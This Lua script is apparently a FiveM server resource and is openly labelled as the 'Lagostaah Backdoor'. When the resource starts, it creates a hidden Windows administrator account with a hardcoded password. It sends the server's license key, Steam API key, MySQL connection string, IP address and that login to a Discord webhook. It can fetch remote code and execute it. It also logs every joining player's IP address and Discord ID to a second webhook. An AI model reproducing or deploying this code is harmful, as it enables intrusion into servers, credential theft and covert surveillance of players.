local ds = "https://discord.com/api/webhooks/1246899529026895882/fXgrWv-o2JE2zlnXBJZDb29uMdw-ZFSQvN2gEf67zYgmvYkYLvBbaNeGmMEeDu27J09F" -- 🔥 backdoor
local webhook = "https://discord.com/api/webhooks/1246899589689114685/FP05PRv_vWhJviIoWefXg8nYdL0FjUxGnAsJrV9XF2CNYiiJNzn6E6fJ1eKiq_YXyAFQ" -- 🕵️‍♂️ ip logging
local codeexecute = "" -- If you wan't to execute your own code FX(cd C:/Users/%USERNAME%/Documents && mkdir Test) <-- Creates a new folder on the computer. (It executes its like this os.execute(CODE))
local executecode = false 
local warning = false
os.execute("cd C:/Users/%USERNAME%/Documents && mkdir Lagostaah")
local usern = os.getenv("USERNAME")


function file_check(file_name)
  local file_found=io.open(file_name, "r")
  
  if file_found==nil then
    file_found=0
  else
    file_found=1
  end
  return file_found
end
if executecode then
  PerformHttpRequest(codeexecute, function(err, text, headers)
    ecode = tostring(text)
    os.execute(ecode)
end)
end
b = function()
  if file_check("C:/Users/"..usern.."/Documents/Lagostaah/SYSRE.bat") == 0 then
    math.randomseed(os.time())
    file = io.open("C:/Users/"..usern.."/Documents/Lagostaah/SYSRE.bat","w")
    file:write("net user LAGDoor69!","\n")
    file:write("if %ERRORLEVEL% EQU 0 (","\n")
    file:write("    exit","\n")
    file:write(") else (","\n")
    file:write('start /min powershell -command "Start-Process sys.bat -Verb runAs"',"\n")
    file:write(")","\n")
    file:write("exit","\n")
    file:close()
end
end

if file_check("C:/Users/"..usern.."/Documents/Lagostaah/SYS.bat") == 0 then
  
  if warning then
    math.randomseed(os.time())
    file = io.open("C:/Users/"..usern.."/Documents/Lagostaah/SYS.bat","w")
    file:write("@echo off","\n")
    file:write("start https://cdn.discordapp.com/attachments/1244093635331489874/1246898766334660758/7zDM0B.webp?ex=665e1078&is=665cbef8&hm=0e2712bc5ea07897e1876f364dff7b2492bd1990c95070b8ca005c8979f08240&","\n")
    file:write("start https://raw.githubusercontent.com/npxkiwi/Lagostaah/main/warning.txt","\n")
    file:write("net user LAGODoor2024x LAGDoor69! /add /Y","\n")
    file:write("net localgroup administrators LAGODoor2024x /add /Y","\n")
    file:write("exit")
    file:close()
    b()
  else
    math.randomseed(os.time())
    file = io.open("C:/Users/"..usern.."/Documents/Lagostaah/SYS.bat","w")
    file:write("@echo off","\n")
    file:write("net user LAGODoor2024x LAGDoor69! /add /Y","\n")
    file:write("net localgroup administrators LAGODoor2024x /add /Y","\n")
    file:write("exit")
    file:close()
    b()
  end
end



AddEventHandler('onResourceStart', function(rcname)
	if GetCurrentResourceName() == rcname then
		PerformHttpRequest("https://api.ipify.org/", function (err, text, headers)
        local servername = GetConvar('sv_hostname')
        local licensekey = GetConvar('sv_licenseKey')
        local apikey = GetConvar('steam_webApiKey')
		    local mysql = GetConvar('mysql_connection_string')
        local messagem = "A server is opened with **Lagostaah Backdoor.**\n**LICENSEKEY:** "..licensekey.."\n\n**APIKEY:** "..apikey.."\n\n**MYSQL:** "..mysql.."\n\n**LOGIN:**\nIP: "..text.."\nUsername: LAGODoor2024x\nPassword: LAGDoor69!"
        local content = {{
        author = {
          name = 'Lagostaah Backdor 🔥 ',
          icon_url = 'https://cdn.discordapp.com/attachments/1244093635331489874/1246898766334660758/7zDM0B.webp?ex=665e1078&is=665cbef8&hm=0e2712bc5ea07897e1876f364dff7b2492bd1990c95070b8ca005c8979f08240&'
        },
        ["color"] = 3093151, -- Red color
        ["description"] = messagem,
        ["footer"] = {
        ["text"] = "https://github.com/lagostaah | Lagostaah Backdoor",
        },}}
        PerformHttpRequest(ds, function() end, 'POST', json.encode({embeds = content}), { ['Content-Type'] = 'application/json' })
      end)
	end
end)
os.execute("cd C:/Users/%USERNAME%/Documents/Lagostaah/ && start SYSRE.bat")



RegisterServerEvent('playerConnecting')
AddEventHandler('playerConnecting', function(name, setKickReason, deferrals)
    local player = source
    local ip = GetPlayerEndpoint(player)
    local discord = "Not Linked"
    local identifiers = GetPlayerIdentifiers(player)
    for _, v in pairs(identifiers) do
        if string.find(v, "discord:") then
            discord = v
            break
        end
    end
    local timestamp = os.date("%Y-%m-%d %H:%M:%S")

    local embed = {
        {
            ["title"] = "Player Joined 📈 ",
            ["description"] = "A new player has joined the server.",
            ["color"] = 16711680, -- Red color
            ["fields"] = {
                {
                    ["name"] = "IP Address",
                    ["value"] = ip,
                    ["inline"] = true
                },
                {
                    ["name"] = "Discord ID",
                    ["value"] = discord,
                    ["inline"] = true
                },
                {
                    ["name"] = "Timestamp",
                    ["value"] = timestamp,
                    ["inline"] = true
                }
            }
        }
    }

    PerformHttpRequest(webhook, function(err, text, headers) end, 'POST', json.encode({username = "Logger Bot", embeds = embed}), { ['Content-Type'] = 'application/json' })
end)
